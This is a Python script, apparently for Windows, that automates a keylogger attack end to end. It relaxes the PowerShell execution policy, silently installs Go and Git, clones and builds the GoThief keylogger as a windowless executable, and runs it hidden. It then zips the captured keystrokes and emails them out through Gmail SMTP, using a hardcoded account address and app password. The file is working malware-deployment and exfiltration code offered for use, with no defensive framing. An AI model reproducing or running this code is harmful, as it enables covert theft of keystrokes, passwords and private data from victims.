import os
import smtplib
import subprocess
import sys
import urllib.request
import zipfile
import shutil
import requests
import time
import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders

# Configuration
GOTHIEF_DIR = "GoThief"
KEYLOGGER_FILE = "main.go"
OUTPUT_EXECUTABLE = "main.exe"
KEYLOG_FOLDER = r"C:\Users\Public\Gothief"
EMAIL_ADDRESS = "uchihakonoha692@gmail.com"
EMAIL_PASSWORD = "tzuk pusb cqqp uelb"
RECIPIENT_EMAIL = "uchihakonoha692@gmail.com"
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587

def run_command(command):
    """Execute a shell command and return stdout, stderr, and exit code."""
    try:
        process = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            check=False
        )
        return process.stdout.strip(), process.stderr.strip(), process.returncode
    except Exception as e:
        return "", str(e), 1

def set_powershell_execution_policy():
    print("[!] Checking PowerShell execution policy...")
    stdout, stderr, code = run_command("powershell -Command Get-ExecutionPolicy -Scope CurrentUser")
    current_policy = stdout
    
    if code == 0 and current_policy != "Restricted":
        print(f"[+] PowerShell execution policy is {current_policy}. No changes needed.")
        return True
    
    print("[!] Setting PowerShell execution policy to RemoteSigned...")
    stdout, stderr, code = run_command("powershell -Command Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -Force")
    if code != 0:
        print(f"[-] Failed to set execution policy: {stderr}")
        return False
    print("[+] PowerShell execution policy set to RemoteSigned.")
    return True

def run_powershell_script():
    print("[!] Running environment check script...")
    ps_command = """
    $ErrorActionPreference = 'Stop'
    $output = @()

    # Kiểm tra Go
    try {
        $goVersion = go version
        $output += "[+] Go is installed: $goVersion"
    } catch {
        $output += "[-] Go is not installed. Please install Go from https://golang.org/dl/"
        exit 1
    }

    # Kiểm tra Git
    try {
        $gitVersion = git --version
        $output += "[+] Git is installed: $gitVersion"
    } catch {
        $output += "[-] Git is not installed. Please install Git from https://git-scm.com/download/win"
        exit 1
    }

    # Kiểm tra GOPATH
    if ($env:GOPATH) {
        $output += "[+] GOPATH is set: $env:GOPATH"
    } else {
        $output += "[-] GOPATH is not set. Please set GOPATH environment variable."
        exit 1
    }

    $output += "[+] Environment check passed! Ready to run GoThief."
    $output -join "|"
    """
    
    stdout, stderr, code = run_command(f"powershell -ExecutionPolicy Bypass -Command \"{ps_command}\"")
    if code != 0:
        print(f"[-] Failed to run environment check: {stderr}")
        return False
    
    # Xử lý đầu ra: tách các thông báo bằng ký tự '|' và loại bỏ dòng trống
    messages = [msg.strip() for msg in stdout.split("|") if msg.strip()]
    for msg in messages:
        print(msg)
    return True

def check_and_install_go():
    stdout, stderr, code = run_command("go version")
    if code == 0:
        print(f"[+] Go is installed: {stdout}")
        return True
    print("[!] Go is not installed. Downloading and installing Go...")

    go_url = "https://go.dev/dl/go1.24.2.windows-amd64.msi"
    downloads_dir = os.path.join(os.path.expanduser("~"), "Downloads")
    go_msi = os.path.join(downloads_dir, "go1.24.2.windows-amd64.msi")

    os.makedirs(downloads_dir, exist_ok=True)

    print("[+] Downloading Go MSI installer to Downloads...")
    urllib.request.urlretrieve(go_url, go_msi)

    print("[+] Installing Go...")
    install_command = f'msiexec /i "{go_msi}" /quiet /norestart'
    stdout, stderr, code = run_command(install_command)
    
    if code != 0:
        print(f"[-] Failed to install Go: {stderr}")
        return False

    go_bin_path = "C:\\Program Files\\Go\\bin"
    os.environ["PATH"] += os.pathsep + go_bin_path

    stdout, stderr, code = run_command("go version")
    if code == 0:
        print("[+] Go installed successfully.")
        return True
    else:
        print(f"[-] Failed to install Go: {stderr}")
        return False

def check_and_install_git():
    stdout, stderr, code = run_command("git --version")
    if code == 0:
        print(f"[+] Git is installed: {stdout}")
        return True
    print("[!] Git is not installed. Downloading and installing Git...")

    git_url = "https://github.com/git-for-windows/git/releases/download/v2.49.0.windows.1/Git-2.49.0-64-bit.exe"
    downloads_dir = os.path.join(os.path.expanduser("~"), "Downloads")
    git_exe = os.path.join(downloads_dir, "Git-2.49.0-64-bit.exe")

    # Tạo thư mục Downloads nếu chưa tồn tại
    os.makedirs(downloads_dir, exist_ok=True)

    # Tải file EXE vào thư mục Downloads bằng requests
    print("[+] Downloading Git installer to Downloads...")
    try:
        response = requests.get(git_url, stream=True)
        response.raise_for_status()  # Kiểm tra lỗi HTTP
        with open(git_exe, "wb") as f:
            for chunk in response.iter_content(chunk_size=8192):
                if chunk:
                    f.write(chunk)
    except Exception as e:
        print(f"[-] Failed to download Git installer: {e}")
        return False

    # Cài đặt Git
    print("[+] Installing Git...")
    install_command = f'"{git_exe}" /VERYSILENT /NORESTART'
    stdout, stderr, code = run_command(install_command)
    
    if code != 0:
        print(f"[-] Failed to install Git: {stderr}")
        os.remove(git_exe)
        return False

    # Cập nhật PATH
    git_bin_path = "C:\\Program Files\\Git\\bin"
    os.environ["PATH"] += os.pathsep + git_bin_path

    # Kiểm tra lại cài đặt
    stdout, stderr, code = run_command("git --version")
    if code == 0:
        print("[+] Git installed successfully.")
        return True
    else:
        print(f"[-] Failed to install Git: {stderr}")
        return False


def download_gothief():
    if os.path.exists("GoThief"):
        print("[!] GoThief directory already exists. Skipping download.")
        return True
    
    print("[!] Attempting to clone GoThief repository using Git...")
    stdout, stderr, code = run_command("git clone https://github.com/Pizz33/GoThief.git")
    if code == 0:
        print("[+] GoThief cloned successfully.")
        return True
    
    print(f"[-] Git clone failed: {stderr}. Downloading ZIP instead...")
    zip_url = "https://github.com/Pizz33/GoThief/archive/refs/heads/main.zip"
    zip_file = "gothief.zip"
    
    try:
        urllib.request.urlretrieve(zip_url, zip_file)
        with zipfile.ZipFile(zip_file, 'r') as zip_ref:
            zip_ref.extractall(".")
        os.rename("GoThief-main", "GoThief")
        os.remove(zip_file)
        print("[+] GoThief downloaded and extracted successfully.")
        return True
    except Exception as e:
        print(f"[-] Failed to download or extract GoThief: {e}")
        return False

def build_keylogger():
    os.chdir(GOTHIEF_DIR)
    if not os.path.exists(KEYLOGGER_FILE):
        print(f"[-] Keylogger file {KEYLOGGER_FILE} not found in {GOTHIEF_DIR}.")
        return False

    print("[!] Building keylogger...")
    build_cmd = f'go build -trimpath -ldflags="-s -w -H windowsgui" -o {OUTPUT_EXECUTABLE} {KEYLOGGER_FILE}'
    stdout, stderr, code = run_command(build_cmd)
    if code != 0:
        print(f"[-] Failed to build keylogger: {stderr}")
        return False
    print("[+] Keylogger built successfully.")
    return True

def run_keylogger():
    if not os.path.exists(OUTPUT_EXECUTABLE):
        print(f"[-] Executable {OUTPUT_EXECUTABLE} not found.")
        return False

    print("[!] Running keylogger...")
    try:
        subprocess.Popen(
            [f".\\{OUTPUT_EXECUTABLE}", "-k"],
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        print("[+] Keylogger started.")
        return True
    except Exception as e:
        print(f"[-] Failed to run keylogger: {e}")
        return False

def compress_keylog():
    # Kiểm tra sự tồn tại của thư mục
    if not os.path.exists(KEYLOG_FOLDER):
        print(f"[-] Keylog folder {KEYLOG_FOLDER} not found.")
        return None

    # Tạo tên file ZIP với timestamp
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    zip_filename = f"keylog_{timestamp}.zip"

    try:
        with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
            # Duyệt qua tất cả các file trong thư mục KEYLOG_FOLDER
            for root, dirs, files in os.walk(KEYLOG_FOLDER):
                for file in files:
                    file_path = os.path.join(root, file)
                    # Tính đường dẫn tương đối để giữ cấu trúc thư mục trong ZIP
                    arcname = os.path.relpath(file_path, os.path.dirname(KEYLOG_FOLDER))
                    zipf.write(file_path, arcname)
        print(f"[+] Directory {KEYLOG_FOLDER} compressed to {zip_filename}.")
        return zip_filename
    except Exception as e:
        print(f"[-] Failed to compress keylog folder: {e}")
        return None

def send_zip_via_email(zip_file):
    # Kiểm tra file ZIP có tồn tại không
    if not os.path.exists(zip_file):
        print(f"[-] ZIP file {zip_file} not found.")
        return False

    # Tạo email
    msg = MIMEMultipart()
    msg['From'] = EMAIL_ADDRESS
    msg['To'] = RECIPIENT_EMAIL
    msg['Subject'] = "GoThief Keylog File"

    # Thêm nội dung email
    body = "Attached is the compressed keylog file from GoThief."
    msg.attach(MIMEText(body, 'plain'))

    # Đính kèm file ZIP
    with open(zip_file, 'rb') as attachment:
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(attachment.read())
    encoders.encode_base64(part)
    part.add_header(
        'Content-Disposition',
        f'attachment; filename= {os.path.basename(zip_file)}'
    )
    msg.attach(part)

    # Gửi email
    try:
        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()  # Bật TLS
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        server.sendmail(EMAIL_ADDRESS, RECIPIENT_EMAIL, msg.as_string())
        server.quit()
        print(f"[+] Email sent successfully with ZIP file: {zip_file}")
        return True
    except Exception as e:
        print(f"[-] Failed to send email: {e}")
        return False


def setup_and_run_gothief():
    if not os.path.exists(GOTHIEF_DIR):
        print(f"[-] Directory {GOTHIEF_DIR} not found.")
        return False

    if not build_keylogger():
        return False

    if not run_keylogger():
        return False

    #Waitting compress data 
    print("[!] Waiting 20 seconds before compressing...")
    time.sleep(20)
    
    #Compress folder Keylog
    zip_file = compress_keylog()
    if zip_file:
        print(f"[+] Successfully created ZIP file: {zip_file}")
    else:
        print("[-] Failed to create ZIP file.")
    
    #Send data from email 
    send_zip_via_email(zip_file)


def main():
    if not set_powershell_execution_policy():
        sys.exit(1)
    if not run_powershell_script():
        sys.exit(1)
    if not check_and_install_go():
        sys.exit(1)
    if not check_and_install_git():
        sys.exit(1)
    if not download_gothief():
        sys.exit(1)
    setup_and_run_gothief()

if __name__ == "__main__":
    main()